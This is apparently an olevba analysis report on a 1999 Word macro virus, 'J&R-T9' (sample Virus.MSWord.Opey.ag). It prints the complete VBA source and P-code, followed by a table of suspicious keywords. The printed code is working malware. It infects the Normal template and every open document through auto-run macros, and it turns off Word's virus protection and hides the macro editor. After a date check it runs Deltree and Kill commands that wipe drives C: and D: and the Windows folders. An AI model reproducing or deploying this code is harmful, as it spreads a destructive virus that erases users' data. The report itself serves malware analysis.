olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.ag
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.ag - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO JR_T9.bas 
in file: Virus.MSWord.Opey.ag - OLE stream: 'Macros/VBA/JR_T9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Macro virus J&R-T9
'This a gift for my love
'Written by NcT-JR_T9!!!
'Date : 19/08/1999
'I hope You like it !!
Public Declare Function WinExec Lib "kernel32" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long
Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub Killer()
    DateKill = Mid(Date, 3, 2)
    Call KillD
        Temp$ = String$(255, 0)              ' Size Buffer
        x = GetWindowsDirectory(Temp$, 255)  ' Make API Call
        Temp$ = Left$(Temp$, x)              ' Trim Buffer
        MsgBox "Don't challenge me !!! Heheheheh !!!", vbOKOnly + vbInformation, "Warning from T9999T :-("
        On Error Resume Next
        WinExec Temp$ + "\RUNDLL.EXE user.exe,exitwindows", 0
        Application.Quit 0, 0, 0
End Sub
Sub VrInit()
   Set Ad = ActiveDocument
   Set nt = NormalTemplate
   TotalMacAd = Ad.VBProject.VBComponents.Count
   For i = 1 To TotalMacAd
     NMacr = Ad.VBProject.VBComponents(i).Name
     If (NMacr <> "JR_T9") And (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
       Application.OrganizerDelete Source:=Ad.FullName, Name:=NMacr, Object:=wdOrganizerObjectProjectItems
     End If
   Next i
   TotalMacNT = nt.VBProject.VBComponents.Count
   For i = 1 To TotalMacNT
     NMacr = nt.VBProject.VBComponents(i).Name
     If (NMacr <> "JR_T9") And (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
       Application.OrganizerDelete Source:=nt.FullName, Name:=NMacr, Object:=wdOrganizerObjectProjectItems
     End If
   Next i
End Sub
Sub ForYou()
    On Error Resume Next
    Call VrInit
    On Error Resume Next
    Call JR_T9
    NTInfected = False
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If clan = "JR_T9" Then NTInfected = True
                If (clan <> "JR_T9") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(j).Name
                    If clan = "JR_T9" Then ODInfected = True
                    If (clan <> "JR_T9") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="JR_T9", Object:=wdOrganizerObjectProjectItems
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="JR_T9", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
End Sub
Sub JR_T9()
    On Error Resume Next
    Application.UserName = "¡Jack! & ¡Rose! - T9999T :-("
    Application.UserAddress = "ncaotri@yahoo.com" + Chr(13) + "I love you. I miss you so much....!!!"
    Application.UserInitials = ":-)"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = ";-) JR_T9 ;-("
        .Title = "Kiss you Rose xxx"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Enabled = False
    CommandBars("Tools").Controls("Customize...").Enabled = False
    CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False
    CommandBars("View").Controls("Toolbars").Enabled = False
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub KillD()
    Temp$ = String$(255, 0)              ' Size Buffer
    x = GetWindowsDirectory(Temp$, 255)  ' Make API Call
    Temp$ = Left$(Temp$, x)              ' Trim Buffer
    On Error Resume Next
    WinExec Temp$ + "\Command\Deltree.exe /y D:\My Documents", 0
    On Error Resume Next
    WinExec Temp$ + "\Command\Deltree.exe /y C:\", 0
    On Error Resume Next
    WinExec Temp$ + "\Command\Deltree.exe /y D:\", 0
    '----------
    On Error Resume Next
    Kill Options.DefaultFilePath(wdDocumentsPath) + "\*.*"
    On Error Resume Next
    Kill Options.DefaultFilePath(wdProgramPath) + "\*.*"
    On Error Resume Next
    Kill Temp$ + "\*.*"
    On Error Resume Next
    Kill Temp$ + "\Systems\*.*"
    On Error Resume Next
    Kill Temp$ + "\Fonts\*.*"
    On Error Resume Next
    Kill "C:\*.*"
End Sub
Sub HelpAbout()
 If Application.UserName = "T9999T" Then
    On Error GoTo Erw
    MsgBox "Chªo chï nh¡n cïa t¤i. MÀy ¢ang bÜ virus ¢Êy !", vbInformation, "Th¤ng bÀo"
 Else
    Application.Caption = "NcT-T9999T Heheheheh !"
    Application.Dialogs(wdDialogHelpAbout).Show
 End If
Erw:
    Application.Caption = "Microsoft Word"
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call ForYou
    ActiveDocument.Save
End Sub
Sub AutoExec()
    On Error Resume Next
    Call ForYou
    ActiveDocument.Save
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call ForYou
End Sub
Sub FileOpen()
    Dialogs(wdDialogFileOpen).Show
    On Error Resume Next
    Call ForYou
    If Val(DateKill) > 22 Then
      Call Killer
    End If
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call ForYou
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileClose()
    On Error Resume Next
    Call ForYou
    If Val(DateKill) > 22 Then
      Call Killer
    End If
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call ForYou
    If Val(DateKill) > 22 Then
      Call Killer
    End If
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoClose()
    On Error Resume Next
    Call ForYou
    ActiveDocument.Close
End Sub
Sub AutoExit()
    On Error Resume Next
    Call ForYou
    If Val(DateKill) > 22 Then
      Call Killer
    End If
    On Error Resume Next
    Call ForYou
    Application.Quit
End Sub
Sub ToolsMacro()
    Call Killer
End Sub
Sub ViewVBCode()
    Call Killer
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Opey.ag
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1184 bytes
' Macros/VBA/JR_T9 - 17493 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0012 "Macro virus J&R-T9"
' Line #1:
' 	QuoteRem 0x0000 0x0017 "This a gift for my love"
' Line #2:
' 	QuoteRem 0x0000 0x0017 "Written by NcT-JR_T9!!!"
' Line #3:
' 	QuoteRem 0x0000 0x0011 "Date : 19/08/1999"
' Line #4:
' 	QuoteRem 0x0000 0x0015 "I hope You like it !!"
' Line #5:
' 	FuncDefn (Public Declare Function WinExec Lib "kernel32" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long)
' Line #6:
' 	FuncDefn (Public Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #7:
' 	FuncDefn (Sub Killer())
' Line #8:
' 	Ld Date 
' 	LitDI2 0x0003 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St DateKill 
' Line #9:
' 	ArgsCall (Call) KillD 0x0000 
' Line #10:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	ArgsLd String$$ 0x0002 
' 	St Temp$ 
' 	QuoteRem 0x002D 0x000C " Size Buffer"
' Line #11:
' 	Ld Temp$ 
' 	LitDI2 0x00FF 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St x 
' 	QuoteRem 0x002D 0x000E " Make API Call"
' Line #12:
' 	Ld Temp$ 
' 	Ld x 
' 	ArgsLd LBound$ 0x0002 
' 	St Temp$ 
' 	QuoteRem 0x002D 0x000C " Trim Buffer"
' Line #13:
' 	LitStr 0x0024 "Don't challenge me !!! Heheheheh !!!"
' 	Ld vbOKOnly 
' 	Ld vbInformation 
' 	Add 
' 	LitStr 0x0017 "Warning from T9999T :-("
' 	ArgsCall MsgBox 0x0003 
' Line #14:
' 	OnError (Resume Next) 
' Line #15:
' 	Ld Temp$ 
' 	LitStr 0x0020 "\RUNDLL.EXE user.exe,exitwindows"
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall WinExec 0x0002 
' Line #16:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0003 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Sub VrInit())
' Line #19:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Ad 
' Line #20:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set nt 
' Line #21:
' 	Ld Ad 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St TotalMacAd 
' Line #22:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TotalMacAd 
' 	For 
' Line #23:
' 	Ld i 
' 	Ld Ad 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #24:
' 	Ld NMacr 
' 	LitStr 0x0005 "JR_T9"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #25:
' 	Ld Ad 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	Ld nt 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St TotalMacNT 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TotalMacNT 
' 	For 
' Line #30:
' 	Ld i 
' 	Ld nt 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #31:
' 	Ld NMacr 
' 	LitStr 0x0005 "JR_T9"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #32:
' 	Ld nt 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub ForYou())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) VrInit 0x0000 
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	ArgsCall (Call) JR_T9 0x0000 
' Line #41:
' 	LitVarSpecial (False)
' 	St NTInfected 
' Line #42:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #43:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #44:
' 	Ld clan 
' 	LitStr 0x0005 "JR_T9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NTInfected 
' 	EndIf 
' Line #45:
' 	Ld clan 
' 	LitStr 0x0005 "JR_T9"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #46:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #48:
' 	LitVarSpecial (False)
' 	St ODInfected 
' Line #49:
' 	StartWithExpr 
' 	Ld opendoc 
' 	With 
' Line #50:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #51:
' 	Ld j 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #52:
' 	Ld clan 
' 	LitStr 0x0005 "JR_T9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ODInfected 
' 	EndIf 
' Line #53:
' 	Ld clan 
' 	LitStr 0x0005 "JR_T9"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld clan 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #54:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	Ld ODInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #56:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "JR_T9"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	EndWith 
' Line #59:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld NTInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "JR_T9"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #62:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub JR_T9())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	LitStr 0x001C "¡Jack! & ¡Rose! - T9999T :-("
' 	Ld Application 
' 	MemSt UserName 
' Line #68:
' 	LitStr 0x0011 "ncaotri@yahoo.com"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0025 "I love you. I miss you so much....!!!"
' 	Add 
' 	Ld Application 
' 	MemSt UserAddress 
' Line #69:
' 	LitStr 0x0003 ":-)"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #70:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #71:
' 	LitStr 0x000D ";-) JR_T9 ;-("
' 	MemStWith Author 
' Line #72:
' 	LitStr 0x0011 "Kiss you Rose xxx"
' 	MemStWith Title 
' Line #73:
' 	ArgsMemCallWith Execute 0x0000 
' Line #74:
' 	EndWith 
' Line #75:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #76:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #77:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #78:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #79:
' 	EndWith 
' Line #80:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #81:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #82:
' 	EndWith 
' Line #83:
' 	OnError (Resume Next) 
' Line #84:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #85:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #86:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #87:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #88:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #89:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #90:
' 	LitVarSpecial (False)
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #91:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #92:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #93:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #94:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Sub KillD())
' Line #97:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	ArgsLd String$$ 0x0002 
' 	St Temp$ 
' 	QuoteRem 0x0029 0x000C " Size Buffer"
' Line #98:
' 	Ld Temp$ 
' 	LitDI2 0x00FF 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St x 
' 	QuoteRem 0x0029 0x000E " Make API Call"
' Line #99:
' 	Ld Temp$ 
' 	Ld x 
' 	ArgsLd LBound$ 0x0002 
' 	St Temp$ 
' 	QuoteRem 0x0029 0x000C " Trim Buffer"
' Line #100:
' 	OnError (Resume Next) 
' Line #101:
' 	Ld Temp$ 
' 	LitStr 0x0027 "\Command\Deltree.exe /y D:\My Documents"
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall WinExec 0x0002 
' Line #102:
' 	OnError (Resume Next) 
' Line #103:
' 	Ld Temp$ 
' 	LitStr 0x001B "\Command\Deltree.exe /y C:\"
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall WinExec 0x0002 
' Line #104:
' 	OnError (Resume Next) 
' Line #105:
' 	Ld Temp$ 
' 	LitStr 0x001B "\Command\Deltree.exe /y D:\"
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall WinExec 0x0002 
' Line #106:
' 	QuoteRem 0x0004 0x000A "----------"
' Line #107:
' 	OnError (Resume Next) 
' Line #108:
' 	Ld wdDocumentsPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #109:
' 	OnError (Resume Next) 
' Line #110:
' 	Ld wdProgramPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	Ld Temp$ 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #113:
' 	OnError (Resume Next) 
' Line #114:
' 	Ld Temp$ 
' 	LitStr 0x000C "\Systems\*.*"
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #115:
' 	OnError (Resume Next) 
' Line #116:
' 	Ld Temp$ 
' 	LitStr 0x000A "\Fonts\*.*"
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #117:
' 	OnError (Resume Next) 
' Line #118:
' 	LitStr 0x0006 "C:\*.*"
' 	ArgsCall Kill 0x0001 
' Line #119:
' 	EndSub 
' Line #120:
' 	FuncDefn (Sub HelpAbout())
' Line #121:
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x0006 "T9999T"
' 	Eq 
' 	IfBlock 
' Line #122:
' 	OnError Erw 
' Line #123:
' 	LitStr 0x002E "Chªo chï nh¡n cïa t¤i. MÀy ¢ang bÜ virus ¢Êy !"
' 	Ld vbInformation 
' 	LitStr 0x0009 "Th¤ng bÀo"
' 	ArgsCall MsgBox 0x0003 
' Line #124:
' 	ElseBlock 
' Line #125:
' 	LitStr 0x0016 "NcT-T9999T Heheheheh !"
' 	Ld Application 
' 	MemSt Caption 
' Line #126:
' 	Ld wdDialogHelpAbout 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	Label Erw 
' Line #129:
' 	LitStr 0x000E "Microsoft Word"
' 	Ld Application 
' 	MemSt Caption 
' Line #130:
' 	EndSub 
' Line #131:
' 	FuncDefn (Sub AutoOpen())
' Line #132:
' 	OnError (Resume Next) 
' Line #133:
' 	ArgsCall (Call) ForYou 0x0000 
' Line #134:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #135:
' 	EndSub 
' Line #136:
' 	FuncDefn (Sub AutoExec())
' Line #137:
' 	OnError (Resume Next) 
' Line #138:
' 	ArgsCall (Call) ForYou 0x0000 
' Line #139:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #140:
' 	EndSub 
' Line #141:
' 	FuncDefn (Sub FileNew())
' Line #142:
' 	OnError (Resume Next) 
' Line #143:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #144:
' 	ArgsCall (Call) ForYou 0x0000 
' Line #145:
' 	EndSub 
' Line #146:
' 	FuncDefn (Sub FileOpen())
' Line #147:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #148:
' 	OnError (Resume Next) 
' Line #149:
' 	ArgsCall (Call) ForYou 0x0000 
' Line #150:
' 	Ld DateKill 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0016 
' 	Gt 
' 	IfBlock 
' Line #151:
' 	ArgsCall (Call) Killer 0x0000 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #154:
' 	EndSub 
' Line #155:
' 	FuncDefn (Sub FileSaveAs())
' Line #156:
' 	OnError (Resume Next) 
' Line #157:
' 	ArgsCall (Call) ForYou 0x0000 
' Line #158:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #159:
' 	EndSub 
' Line #160:
' 	FuncDefn (Sub FileClose())
' Line #161:
' 	OnError (Resume Next) 
' Line #162:
' 	ArgsCall (Call) ForYou 0x0000 
' Line #163:
' 	Ld DateKill 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0016 
' 	Gt 
' 	IfBlock 
' Line #164:
' 	ArgsCall (Call) Killer 0x0000 
' Line #165:
' 	EndIfBlock 
' Line #166:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #167:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #168:
' 	EndSub 
' Line #169:
' 	FuncDefn (Sub FileExit())
' Line #170:
' 	OnError (Resume Next) 
' Line #171:
' 	ArgsCall (Call) ForYou 0x0000 
' Line #172:
' 	Ld DateKill 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0016 
' 	Gt 
' 	IfBlock 
' Line #173:
' 	ArgsCall (Call) Killer 0x0000 
' Line #174:
' 	EndIfBlock 
' Line #175:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #176:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #177:
' 	EndSub 
' Line #178:
' 	FuncDefn (Sub AutoClose())
' Line #179:
' 	OnError (Resume Next) 
' Line #180:
' 	ArgsCall (Call) ForYou 0x0000 
' Line #181:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #182:
' 	EndSub 
' Line #183:
' 	FuncDefn (Sub AutoExit())
' Line #184:
' 	OnError (Resume Next) 
' Line #185:
' 	ArgsCall (Call) ForYou 0x0000 
' Line #186:
' 	Ld DateKill 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0016 
' 	Gt 
' 	IfBlock 
' Line #187:
' 	ArgsCall (Call) Killer 0x0000 
' Line #188:
' 	EndIfBlock 
' Line #189:
' 	OnError (Resume Next) 
' Line #190:
' 	ArgsCall (Call) ForYou 0x0000 
' Line #191:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #192:
' 	EndSub 
' Line #193:
' 	FuncDefn (Sub ToolsMacro())
' Line #194:
' 	ArgsCall (Call) Killer 0x0000 
' Line #195:
' 	EndSub 
' Line #196:
' 	FuncDefn (Sub ViewVBCode())
' Line #197:
' 	ArgsCall (Call) Killer 0x0000 
' Line #198:
' 	EndSub 
' Line #199:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
